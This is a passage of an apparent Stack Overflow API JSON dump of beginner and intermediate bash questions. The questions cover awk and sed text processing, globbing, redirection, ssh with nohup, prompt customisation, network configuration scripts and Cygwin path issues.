dateVal;\n        print timesupport[1] | sed -n -e \"s_\\(..\\)\\(.\\)\\(..\\)\\(.\\)\\(....\\)_\\5-\\3-\\1_p\" | getline timeVal1 | date --utc --date \"timeVal1\" +%s | getline timeVal;\n        x=dateVal - timeVal;\n        if (supports[i] !~ /n\\\\\\\\a*/ &amp;&amp; supports[i] !~ /n\\/a*/ &amp;&amp; $2 !~ /\\NULL/)\n            print $1\",\"$2\",\"timesupport[1]\",\"account[1]\"\\\",\"products[i]\"\\\",\"$6;\n\n    }\n}\n</code></pre>\n\n<p>The main thread was in post 12634588. Thanks!</p>\n"}]}
{"total":16352,"page":16,"pagesize":100,"questions":[{"tags":["bash","shell","emacs","eshell","ido"],"answer_count":7,"favorite_count":8,"up_vote_count":10,"down_vote_count":0,"view_count":1462,"score":10,"question_id":1112805,"title":"Emacs ido-style shell","body":"<p>Is there a command line shell or shell customization that supports emacs-style ido find file?  In emacs, I can navigate to a directory extremely quickly using <code>C-x C-f</code> and <code>(ido-mode t)</code>. </p>\n\n<p>Ideally, I'm looking for a solution that can be used outside of emacs. Though I'd be open for a way to quickly change directories within an eshell buffer.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12649660,"title":"How to compare two outputs in bash and find the CPU time?","body":"<p>I want to calculate several CRC and compare them to see if any of them are alike. In other words x != y s.t. CRC(x) == CRC(y). The code I have written so far is: </p>\n\n<pre><code>#!/bin/bash\nclear;\n\necho \"The script starts now\" \n$SECONDS = 0;\n\nwhile(true) \n  do    \n    ./pycrc.py --model crc-32 --check-string $RANDOM\n    ./pycrc.py --model crc-32 --check-string $RANDOM     \ndone\n\necho \"The script is finish\" \necho \"That took approximately $SECONDS seconds\"\n</code></pre>\n\n<p>How do you manage to save the output from <code>./pycrc.py</code> and compare the variables?</p>\n"},{"tags":["bash","shell","sed","awk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":12634588,"title":"How to split string from array with repeating fileds?","body":"<p>I have got an input file with following syntax:</p>\n\n<pre><code>\"ID\",\"Company Name\",\"AccountManager\",\"Product\",\"Support Type\",\"Country\"\n</code></pre>\n\n<p>Example:</p>\n\n<pre><code>\"1\",\"Company one\",\"Surname Name / Phone/ Cell Phone \",\"Product► (d2XXXXXX) ► Version\",\"29.10.2012 ► Type of support\",\"Singapore\"\n\n\"2\",\"Company two\",\"Surname Name / Phone/ Cell Phone \",\"Product► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\",\"31.10.2012 ► Type of support\\n28.10.2012 ► Type of support\\nn/a ► Type of support\",\"Indonesia\"\n\n\"3\",\"Company three\",\"Surname Name / Phone/ Cell Phone \",\"Product► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version\\nProduct► (d2XXXXXX) ► Version,\"31.12.2012 ► Type of support\\nType of support\\nn\\\\a ► Type of support\\n31.03.2013 ► Type of support\\n25.10.2012 ► Type of support\\nn\\\\a ► Type of support\",\"USA\"\n</code></pre>\n\n<p>The first company has only one product, the second company has 3 products - they are separated with <code>\\n</code> (Product and Support Type) and the third company has 6 products.</p>\n\n<p>In the output this string must be separate and repeat values of the columns:</p>\n\n<p><code>\"ID\",\"Company Name\",\"AccountManager\",\"Country\"</code>, but <code>\"AccountManager\"</code> should have only Surname and Name, and column Support Type should be compared with today date - if date in support type different with today date in values from 27 to 32 days this columns must be in output file. If we have got <code>n/a</code> in the Support Type it should be missed.</p>\n\n<p>The output should look like:</p>\n\n<pre><code>\"1\",\"Company one\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"29.10.2012\",\"Singapore\"\n\"2\",\"Company two\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"28.10.2012\",\"Indonesia\"\n\"2\",\"Company two\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"31.10.2012\",\"Indonesia\"\n\"3\",\"Company three\",\"Surname Name\",\"Product► (d2XXXXXX) ► Version\",\"25.10.2012\",\"USA\"\n</code></pre>\n\n<p>How can I do this in bash?</p>\n"},{"tags":["linux","bash","while-loop","return-value","archlinux"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12651750,"title":"Why does redirecting output affect the result of a test in bash?","body":"<p>I'm trying to write a script to launch xfce and xbmc in their own x sessions.</p>\n\n<p>To do this I'm setting the <code>DISPLAY</code> value, running the first one in the background and waiting until I get a successful return from <code>xset q</code>. Then I change <code>DISPLAY</code> and do the same for the other.</p>\n\n<p>I'm writing this piece by piece to check I've got the syntax right for each part and the part I'm stuck on is the 'waiting until I get a successful return from <code>xset q</code>.</p>\n\n<pre><code>export DISPLAY=\":0.0\"\nwhile [[ ! `xset q` ]]\ndo\n  echo -n \".\"\ndone\n</code></pre>\n\n<p>This code seems to work so when XFCE is running it exits immediately and when it is not it sits there printing <code>.xset: unable to open display \":0.0\"</code></p>\n\n<p>However I don't want to see the output of <code>xset</code> so I'm trying to redirect its output.</p>\n\n<pre><code>export DISPLAY=\":0.0\"\nwhile [[ ! `xset q &gt; /dev/null 2&gt;&amp;1` ]]\ndo\n  echo -n \".\"\ndone\n</code></pre>\n\n<p>Adding this redirection however seems to break the detection, and regardless of whether XFCE is running or not it just sits there printing dots.</p>\n\n<p>I've tested the two commands on their own and in a shell script on their own they both work as I expect, returning 1 when XFCE is not running and 0 when it is.</p>\n\n<p>Can anyone explain why putting that command inside of <code>[[ ! &#96;&#8230;&#96; ]]</code> breaks the <code>while</code> test and how I could rewrite this <code>while</code> loop correctly?</p>\n\n<p>(Running on Arch)</p>\n"},{"tags":["bash","pattern-matching"],"answer_count":3,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":95,"score":8,"question_id":12596468,"title":"Why does this pattern match `ab`, but not `ba`?","body":"<p>I fiddled around with <a href=\"http://www.gnu.org/software/bash/manual/bashref.html#Pattern-Matching\" rel=\"nofollow\">extended globbing</a> in bash, but there is some oddity with the inverse matcher <code>!(PATTERN)</code>. Consider the following example</p>\n\n<pre><code>$ touch ab ba\n$ shopt -s extglob\n\n$ echo *a*\nab ba\n$ echo !(a)*a*\nab ba\n$ echo *a*!(a)\nab\n</code></pre>\n\n<p>Now it looks like <code>!()</code> matches the empty string, but why doesn't <code>*a*!(a)</code> match <code>ba</code>?</p>\n\n<p>I assumed that in the second example <code>ab</code> is matched like so</p>\n\n<pre><code>!(a) -&gt;  \"\"\n*    -&gt;  \"\"\na    -&gt;  \"a\"\n*    -&gt;  \"b\"\n</code></pre>\n\n<p>which in turn would suggest a match of <code>ba</code> in the third case like so</p>\n\n<pre><code>*    -&gt;  \"b\"\na    -&gt;  \"a\"\n*    -&gt;  \"\"\n!(a) -&gt;  \"\"\n</code></pre>\n\n<p>but looks like this doesn't work.</p>\n\n<p>Even considering greediness, that doesn't make any sense to me. What am I missing?</p>\n\n<p>edit:<br>\nI'm on <code>GNU bash, Version 4.1.7(2)-release (i386-apple-darwin10.4.0)</code></p>\n"},{"tags":["regex","linux","bash","automation"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":136,"score":0,"question_id":12642260,"title":"Better bash script to create directory structure","body":"<p>I want to create folders with plain text with a structure like:</p>\n\n<pre><code>Folder\n| Subfolder\n| | Deeper-subfolder\n| Subfolder\n</code></pre>\n\n<p>I thought about using a base command like <code>mkdir</code> and found that post : <a href=\"http://stackoverflow.com/questions/5374382/bash-script-that-creates-a-directory-structure#answer-5374519\">Bash script that creates a directory structure</a>, but it still needs to write structure like :</p>\n\n<pre><code>Folder\nFolder/subfolder\nFolder/subfolder/deeper-subfolder\nFolder/subfolder\n</code></pre>\n\n<p>So I would need to change the regex used in : </p>\n\n<pre><code>sed '/^$/d;s/ /\\//g' struct.txt | xargs mkdir -p\n</code></pre>\n\n<p>What bash command could I use to do this?</p>\n"},{"tags":["bash","shell","command-line","console","terminal"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12649896,"title":"Why doesn't my terminal output unicode characters properly?","body":"<p>For example, my terminal does</p>\n\n<pre><code>$ echo -e \"\\xE2\\x98\\xA0\"\n���\n</code></pre>\n\n<p>instead of </p>\n\n<pre><code>$ echo -e \"\\xE2\\x98\\xA0\"\n☠\n</code></pre>\n\n<p>. Why is this? How do I make my terminal output the proper unicode symbols?</p>\n\n<p>I'm using Gnome 3's Terminal on Arch Linux.</p>\n\n<p>The output of <code>locale</code> shows</p>\n\n<pre><code>LANG=C\nLC_CTYPE=\"C\"\nLC_NUMERIC=\"C\"\nLC_TIME=\"C\"\nLC_COLLATE=\"C\"\nLC_MONETARY=\"C\"\nLC_MESSAGES=\"C\"\nLC_PAPER=\"C\"\nLC_NAME=\"C\"\nLC_ADDRESS=\"C\"\nLC_TELEPHONE=\"C\"\nLC_MEASUREMENT=\"C\"\nLC_IDENTIFICATION=\"C\"\nLC_ALL=\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":131,"score":0,"question_id":7676718,"title":"Bash Shell Programing","body":"<p>I am trying to print the stars below on the screen using for or while loop. I don't know if I should treat as a string or what. If it is a string should I use foreach loop, just don't know where to start really. </p>\n\n<pre><code>******************\n   ***********\n     *******\n       ***\n        *\n</code></pre>\n\n<p>I am trying to get it to work even though I know it is wrong, but I am trying. Thanks for the advice.</p>\n\n<pre><code>#!/bin/bash\n\nwhilefunc() {\n    echo \"*************\"\n    echo\"  ******  \"\n    echo\"   ****   \"\n }\n\ni=2\n\nwhile [ $i = 2 ]\ndo\n    whilefunc\ndone\n\nexit\n</code></pre>\n"},{"tags":["bash","shell","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12647695,"title":"using variable within sed on lines that match pattern","body":"<p>I'm trying to execute the following command and sed is not liking it. I'm sure the fix is simple but I haven't found any solutions yet.</p>\n\n<p>On lines that don't begin with http, I'm trying to place the contents of $currentlink at the beginning of the line. Sed is throwing an error. Any help would be greatly appreciated--thanks!</p>\n\n<pre><code>sed '/^http/!s/^/$currentlink\\//g'\n</code></pre>\n"},{"tags":["c","bash","printf","justify","text-justify"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":120,"score":3,"question_id":12638520,"title":"Using printf, left- and right-justify two strings to a given length","body":"<p>Using printf in C or Bash shell, how can I left- and right-justify two strings (character arrays) to a given length?</p>\n\n<p>E.g. if the strings are \"stack\" and \"overflow\", and the length is 20 characters, I wish to print</p>\n\n<pre><code>stack-------overflow\n</code></pre>\n\n<p>(for clarity, each space is shown as a dash).</p>\n\n<p>The strings are of unknown length. If the total length + 1 exceeds the length given, is it possible to truncate one or both strings from either given direction and leave a space between them? E.g. if length is 10, can we get any of these?</p>\n\n<pre><code>stack-over\nstack-flow\ns-overflow\nk-overflow\n</code></pre>\n\n<p>I know that printf(\"%10s\", string) justifies one string to the right and printf(\"%-10s\", string) justifies one string to the left, but can't find a way to justify 2 strings, or to truncate them.</p>\n"},{"tags":["java","bash","unit-testing","input","io-redirection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12648101,"title":"Bash input redirection with newlines","body":"<p>So for an assignment at school I am required to make a program in java that manages some students at a college, the user may invoke a number of function, but I started by testing 'add'.</p>\n\n<p>My prof recommends that I use input redirection, because I can easily test the program over and over, without much typing.  Now here is the issue.</p>\n\n<pre><code>echo `&lt; input.txt`\nadd Student Name 123 Street,City,Province,Postal Code q\n#Input rediraction ate my newlines\ncat input.txt\nadd\nStudent Name\nStreet,City,Province,Postal Code\nq\n#What I actually want to run\njava -cp . TestCollege &lt; input.txt #fail horribly\n</code></pre>\n\n<p>As you can see bash removes the newline characters I use to delimit my input, and thus my program crashes, because when you run it in interactive mode, Scanner.getLine() just blocks until input occurs.</p>\n\n<p>Any idea how I can give my program the input with the newlines, it seems to work fine in windows \"cmd\" but not in \"bash\".</p>\n"},{"tags":["bash","ssh","pid","nohup"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12647382,"title":"Get the PID of a process started with nohup via ssh","body":"<p>I want to start a process using nohup on a remote machine via ssh. The problem is how to get the PID of the process started with nohup, so the \"process actually doing something\", not some outer shell instance or the like. Also, I want to store stdout and stderr in files, but that is not the issue here...</p>\n\n<p>Locally, it works flawlessly using</p>\n\n<pre><code>nohup sleep 30 &gt; out 2&gt; err &lt; /dev/null &amp; echo $!\n</code></pre>\n\n<p>It is echoing me the exact PID of the command \"sleep 30\", which I can also see using \"top\" or \"ps aux|grep sleep\".</p>\n\n<p>But I'm having trouble doing it remotely via ssh. I tried something like</p>\n\n<pre><code>ssh remote_machine 'nohup bash -c \"( ( sleep 30 ) &amp; )\" &gt; out 2&gt; err &lt; /dev/null'\n</code></pre>\n\n<p>but I cannot figure out where to place the \"echo $!\" so that it is displayed in my local shell. It is always showing me wrong PIDs, for example the one of the \"bash\" instance etc.</p>\n\n<p>Has somebody an idea how to solve this?</p>\n\n<p>EDIT:\nOK, the \"bash -c\" might not be needed here. Like Lotharyx pointed out, I get the right PID just fine using</p>\n\n<pre><code>ssh remote 'nohup sleep 30 &gt; out 2&gt; err &lt; /dev/null &amp; echo $!'\n</code></pre>\n\n<p>but then the problem is that if you substitute \"sleep 30\" with something that produces output, say, \"echo Hello World!\", that output does not end up in the file \"out\", neither on the local nor on remote side. Anybody got an idea why?</p>\n\n<p>EDIT2: My fault! There was just no space left on the other device, that's why the files \"out\" and \"err\" stayed empty!</p>\n\n<p>So this is working. In addition, if one wants to call multiple commands in a row, separated by a semicolon (;), one can still use \"bash -c\", like so:</p>\n\n<pre><code>ssh remote 'nohup bash -c \"echo bla;sleep 30;echo blupp\" &gt; out 2&gt; err &lt; /dev/null &amp; echo $!'\n</code></pre>\n\n<p>Then it prints out the PID of the \"bash -c\" on the local side, which is just fine. (It is impossible to get the PID of the \"innermost\" or \"busy\" process, because every program itself can spawn new subprocesses, there is no way to find out...)</p>\n"},{"tags":["linux","bash","svn","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":12337446,"title":"commands work in linux terminal but not in shell script","body":"<p>I am trying to run the following shell script using the command:</p>\n\n<pre><code>$ bash linuxScript.sh\n</code></pre>\n\n<p>This is what my script looks like</p>\n\n<pre><code>#!/bin/bash\nsvnroot=.../resources\nFINDBUGS_HOME=\"~/opt/findbugs-2.0.1\"\nsvn help\nsvn export --force \".../resources/GUI.jar\"\n\nopt=$1 \ncase $opt in\n     -normal)\n    echo \"normal mode\"\n    java -jar %FINDBUGS_HOME%\\lib\\findbugs.jar -textui -onlyAnalyze common.-,ufm.- -output UFMGUI_Normal.html -html GUI.jar;;\n    ...\nesac\n</code></pre>\n\n<p>Now for some reason the command <code>svn help</code> and <code>svn export</code> don't work well (I am calling svn help only to emphasize my point).</p>\n\n<p>They let out the following errors:</p>\n\n<pre><code>'unknown command: 'help\nType 'svn help' for usage.\n' is not properly URI-encodedaire.com/repos/ufm_ui/branches/UFM_3_7/tools/build/resources/GUI.jar\n</code></pre>\n\n<p>And if I'm already asking it also shouts on non svn related commands:</p>\n\n<pre><code>:command not founde 7:\n'inuxScript.sh: line 8: syntax error near unexpected token 'in\n'inuxScript.sh: line 8: 'case $opt in\n</code></pre>\n\n<p>Now the weird thing is that if I type the svn commands in the terminal everything works fine! I tried to google the solution and I also searched this forum but I couldn't find anything useful.</p>\n\n<p>Help ill be greatly appreciated. Thankyou!</p>\n"},{"tags":["bash","file-attributes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12647205,"title":"Toggle file immutable","body":"<p>I which to make a simple little bash script that toggle some files (specifically my desktop icons so they don't move when they're not supposed to)</p>\n\n<p>I have the command to make the files [im]mutable:</p>\n\n<pre><code>sudo chattr +i ~/.config/xfce4/desktop/icons*\n</code></pre>\n\n<p>However, to make the script toggle the state, i need to check the state, and act accordingly. But i'm not so good at the bash-codes and some googling doesn't bring up any solutions</p>\n\n<p>the answer is probably something to do with 'lsattr' and 'grep' but i'm not sure in which form they should take...</p>\n\n<p>(If the answer can be in the form of an if statement, that would be lovely :D )</p>\n"},{"tags":["linux","bash","shell","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":179,"score":1,"question_id":10084090,"title":"Need to remove the count from the output when using \"uniq -c\" command","body":"<p>I am trying to read a file and sort it by number of occurrences of a particular field. Suppose i want to find out the most repeated date from a log file then i use uniq -c option and sort it in descending order. something like this </p>\n\n<pre><code>uniq -c | sort -nr \n</code></pre>\n\n<p>This will produce some output like this - </p>\n\n<pre><code>809 23/Dec/2008:19:20\n</code></pre>\n\n<p>the first field which is actually the count is the problem for me .... i want to get ony the date from the above output but m not able to get this. I tried to use cut command and did this</p>\n\n<pre><code>uniq -c | sort -nr | cut -d' ' -f2 \n</code></pre>\n\n<p>but this just prints blank space ... please can someone help me on getting the date only and chop off the count. I want only </p>\n\n<pre><code>23/Dec/2008:19:20\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash","shell"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":43,"score":3,"question_id":12646917,"title":"Show job count in bash prompt only if nonzero","body":"<p>A typical prompt in bash in something like:</p>\n\n<pre><code>PS1=\"\\u@\\h:\\w\\$ \"\n</code></pre>\n\n<p>The you can show the number of background jobs using <code>\\j</code>, e.g.:</p>\n\n<pre><code>PS1=\"\\u@\\h:\\w [\\j]\\$ \"\n</code></pre>\n\n<p>Which is useful, because every now and then I forget I have a stopped job and only notice when it complains if I manually logout from the shell.</p>\n\n<p>However, 95% of the time, the background job count is 0 and showing it in the prompt is superfluous. </p>\n\n<p>How can I show the job count in the prompt, but only if it's nonzero?</p>\n"},{"tags":["bash","networking","terminal","raspberry-pi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12646278,"title":"How to send test to a certain line using Bash Scripting","body":"<p>I know there are other posts on this but i cannot get any of them to work. My problem is that i want to create a script on my rpi to automatically change wifi networks and change eth0 between static and dhcp. It is not yet finished i am currently only working on the wireless part. But the script so far reads...</p>\n\n<pre><code>#!/bin/bash\nANS=''\nssid=''\npsk=''\nfile='/etc/network/interfaces'\n\nfunction wireless {\n    echo 'The wireless network '$ssid' has now been set up'\n    start\n}\nfunction ssid {\n    echo 'What is your Network SSID?'\n    echo -e '&gt; \\c'\n    read ssid\n    echo 'You entered '$ssid'. Is this correct? (y/n)'\n    echo -e '&gt; \\c'\n    read ANS\n    if [ $ANS = 'y' ]; then\n        psk\n    else\n        echo 'Please renter your SSID'\n        ssid\n    fi\n}\nfunction psk {\n    echo 'What is your Network PSK?'\n    echo -e '&gt; \\c'\n    read psk \n    echo 'You entered '$psk'. Is this correct? (y/n)'\n    echo -e '&gt; \\c'\n    read ANS\n        if [ $ANS = 'y' ]; then\n                wireless\n        else\n                echo 'Please renter your PSK'\n                psk\n        fi\n\n}\nfunction start {\necho 'What do you want to do?'\necho ''\necho 'Press w to set up wireless ssid and psk'\necho 'Press s to change eth0 to a static ip address'\necho 'Press d to change eth0 to a dhcp ip address'\necho ''\necho 'Or press ctrl+c to quit'\necho -e '&gt; \\c'\nread ANS\nif [ $ANS = 'w' ]; then\n    ssid\nelse\n    if [ $ANS = 's' ]; then\n        static\n    else\n        if [ $ANS = 'd' ]; then\n            dhcp\n        fi\n    fi\nfi\n}\n#backup of /etc/network/interfaces\n#auto lo\n#iface lo inet loopback\n#iface eth0 inet dhcp\n#iface eth0 inet static\n#   address ###########\n#   netmask #############\n#   broadcast ###########\n#   gateway ##########\n#\n#allow-hotplug wlan0\n#\n#auto wlan0\n#\n#iface wlan0 inet dhcp\n#wpa-ssid \"Home Network\"\n#wpa-psk \"psk\"\nstart\nexit 0\n</code></pre>\n\n<p>So thats all fine but in the function wireless i want to send the psk and the ssid to lines 15 and 16 of /etc/network/interfaces. Please could someone tell me the best method to do this by.\nThanks</p>\n"},{"tags":["bash","cygwin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12645662,"title":"readlink in cygwin","body":"<p>I do the most basic thing in every script </p>\n\n<pre><code>  SCRIPT=`readlink -f ${0}`\n  HOME=`dirname $SCRIPT`\n</code></pre>\n\n<p>and, given <code>$0 = C:\\Users\\dir\\file</code>, <code>readlink</code> gives me <code>/cygdrive/c/CURRENT_DIRECTORY/C:\\Users\\dir\\file</code> so that the next <code>dirname</code> produces terrible <code>/cygdrive/c/Users/CURRENT_DIRECTORY/C:\\Users\\dir</code> instead of <code>C:\\Users\\dir</code> or <code>/cygdrive/c/Users/dir</code></p>\n\n<p>Is it supposed to work this way?</p>\n"},{"tags":["bash","unix","node.js","markdown","less"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":606,"score":1,"question_id":7599447,"title":"less-style markdown viewer for UNIX systems","body":"<p>I have a Markdown string in JavaScript, and I'd like to display it (with bolding, etc) in a <code>less</code> (or, I suppose, <code>more</code>)-style viewer for the command line.</p>\n\n<p>For example, with a string </p>\n\n<pre><code>\"hello\\n\" + \n\"_____\\n\" + \n\"*world*!\"\n</code></pre>\n\n<p>I would like to have output pop up with scrollable content that looks like</p>\n\n<blockquote>\n  <h2>hello</h2>\n  \n  <p><em>world</em></p>\n</blockquote>\n\n<p>Is this possible, and if so how?</p>\n"},{"tags":["bash",".bash-profile"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12645205,"title":"Outputting dirty state of git repo in command line issue","body":"<p>if i run this in command line with in git repo</p>\n\n<pre><code>git status 2&gt; /dev/null | grep -iw 'modified'\n</code></pre>\n\n<p>the output i get</p>\n\n<pre><code>#   modified:   .rvmrc\n</code></pre>\n\n<p>so my assumption is that if i plug this in into if statement i will get true that will execute the line of code</p>\n\n<p>but when i created function as part of the .bash_profile, and here is the code i have:</p>\n\n<pre><code>## Prompt ##\npath=\"$white\\w$reset\"\nfolder_name=\"$white\\W$reset\"\ngit_branch=\"\\$(git branch 2&gt;/dev/null | grep -e '\\* ' | sed 's/^..\\(.*\\)/$red(\\1)$reset/')\"\nrvm=\"$green(\\$(~/.rvm/bin/rvm-prompt i v p))$reset\"\n\n# Checks if working tree is dirty\nfunction _git_st {\n  if [[ $(git status 2&gt; /dev/null | grep -iw 'modified')  ]]; then\n    echo \"[x]\"\n  fi\n}\ngit_st=\"$yellow`_git_st`$reset\"\n\nPS1=\"$rvm $folder_name $git_branch $git_st \\$ \"\n</code></pre>\n\n<p>X is not echoed.... i am bit lost, and not sure what i am doing wrong.</p>\n\n<p>this is the out put i get:</p>\n\n<pre><code>(ruby-1.9.2-p290) folder-git (master)  $ git status\n# On branch master\n# Changes not staged for commit:\n#   (use \"git add &lt;file&gt;...\" to update what will be committed)\n#   (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory)\n#\n#   modified:   .rvmrc\n#\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n(ruby-1.9.2-p290) folder-git (master)  $ \n</code></pre>\n"},{"tags":["bash","shell","unix","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12625058,"title":"find a string in a file","body":"<p>I have a file of form\nfoo.txt</p>\n\n<pre><code>  id, some_string, stringy_string.. \n  and so on\n</code></pre>\n\n<p>How do I find a particular id in this foo.txt</p>\n\n<p>This id will/should be present in just one line. (i.e no multiple instances?)\nThanks</p>\n"},{"tags":["python","bash","autocomplete"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12644724,"title":"Have bash auto complete functions from python script","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8387924/python-argparse-and-bash-completion\">Python argparse and bash completion</a>  </p>\n</blockquote>\n\n\n\n<p>In a bash prompt (like on a Ubuntu system) if you type <code>service</code> and then tab a few times you would get a list of all the services available. </p>\n\n<p>Is there a way to do the same with a python script? So if you had a script called music that looked like this:</p>\n\n<pre><code>def dumbstuff():\n    #plays pop music...\n\ndef rockingstuff():\n    #Plays music that will scare your mother...\n</code></pre>\n\n<p>And on the command line you type <code>music</code> with a few tabs I would like to see outputted:</p>\n\n<pre><code>dumbstuff\nrockingstuff\n</code></pre>\n\n<p>Is there a way to do this?</p>\n"},{"tags":["bash","operating-system"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12645004,"title":"Simple Bash OS heelp","body":"<p>I am trying to write a bare-bones OS. When I say bare-bones I mean just system essentials: bash, mount, cd, ls, etc..</p>\n\n<p>Where is a good place to start?</p>\n\n<p>I've looked all over the internet but found nothing :(</p>\n"},{"tags":["bash","scripting","hostname"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12628085,"title":"Should I prefer $(hostname) over ${HOSTNAME}","body":"<p>So there's the command <code>hostname</code> and the environment variable <code>HOSTNAME</code> and I'm thinking that the latter is a small savings of a fork &amp; exec in general scripting. On the systems I'm concerned with (Ubuntu) they seem equivalent. It might be different if I were passing one of the flags to <code>$(hostname)</code>. Is there an existing consensus on this I'm not aware of?</p>\n"},{"tags":["windows","bash","unix","ant","cygwin"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12644370,"title":"Calling bash script from ant in (linux) and (cygwin on windows)","body":"<p>I have a <code>bash</code> script called <code>bashScript.sh</code>.</p>\n\n<p>I need to start <code>bashScript.sh</code> inside an <code>ant</code> script on windows(cygwin) and unix/linux.</p>\n\n<p>How do i do this?</p>\n\n<p>I have tried this, and a few other solutions, using the environment variable but there is no <code>env.OSTYPE</code>. And using...</p>\n\n<pre><code>    &lt;exec executable=\"/bin/bash\" failonerror=\"true\"&gt;\n        &lt;arg value=\"bashScript.sh\"/&gt;\n    &lt;/exec&gt;\n</code></pre>\n\n<p>...does not work on windows(cygwin), because cygwin fails to find <code>\\bin\\bash</code>.</p>\n\n<p>Thanks, if you need more information let me know.</p>\n"},{"tags":["c","osx","bash","shell","terminal"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":367,"score":3,"question_id":7247543,"title":"Restarting program automatically on crash in OSX","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/696839/how-do-i-write-a-bash-script-to-restart-a-process-if-it-dies\">How do I write a bash script to restart a process if it dies?</a>  </p>\n</blockquote>\n\n\n\n<p>I've made a C program that occasionally crashes and I can't fix it (Some problem with getaddrinfo which is rather spontaneous seeming). I would like to restart the program upon the crash. I thought this would be easy. I was going to separate the problematic libcurl code with a fork and look up how I can detect a process from closing so it can be forked again. However I went with the \"easy\" option of trying to restart the entire program and recover data from a file.</p>\n\n<p>I tried this:</p>\n\n<pre><code>#!/bin/sh\nwhile true; do\n    cd \"~/ProgramDir\"\n    exec \"~/ProgramDir/Program\"\ndone\n</code></pre>\n\n<p>But when the program exits on a failure it starts outputting the next execution to the terminal input if that makes sense. SO if I pretend my program is just a Hello World program then it would do something like this:</p>\n\n<pre><code>bash-3.2$ start.sh\nHello World!\nHello World!\nbus error\nbash-3.2$ Hello World!\n-bash: Hello: command not found\nbash-3.2$ Hello World!\n-bash: Hello: command not found\n</code></pre>\n\n<p>It wont continue the program as before. The terminal thinks the program has exited but then takes the output of the next execution to the terminal input.</p>\n\n<p>What is the proper way to do this?</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12593534,"title":"how to monitor various process on linux","body":"<p>My application is composed of 4 unique processess. For HA reason, i am going to start 3 instances of each such that 2 instances  of each process would run on a single linux host and one another set on a different linux host. \nI am trying to write a monitoring script (bash script) that would periodically poll for these processess. My main challenge is that it sounds kludgy to write a script which is host name and process name dependent. For example , i dont want to write a script which monitors process-A-1, process-B-1, process-A-2, process-B-2 on linux host with IP Address A and process-A-3 on linux IP host Address B.</p>\n\n<p>One way to write a monitoring script which is independent of host and process name is that when each of these process starts, they create a mutex name. For example, process-A-1 will create a mutex called mutex.process-A-1 and process-A-2 will create a mutex called mutex.process-A-2.  Then all the script has to do is look for mutexes on a system with name like mutex.process-A*. The script then can use a ps command to check if those processess are running.</p>\n\n<p>My question is that coupling with mutex name okay? Is there another way you have solved this problem on  linux?</p>\n"},{"tags":["linux","bash","shell","unix","aix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12642677,"title":"Shell script doesn't do anything when executed","body":"<p>I'm really new at shell scripting and I'm not sure what is wrong with my code. Basically, my code reads text files for email address, directory location and save it in array. \nIf file system exceeds disk usage, it will send out notification email and move log files to backup folders. But it doesn't do anything, can someone please tell me why it doesn't work?\nThanks in advance</p>\n\n<pre><code>#!/bin/sh\ncounter=0\nlogloc=/home/temp/ServerLogs\nbackup=/home/work/test\n## Reads the location of the file systems that needs to be investigated from location.txt\n## and save it into an array\nwhile read -r line; do\n   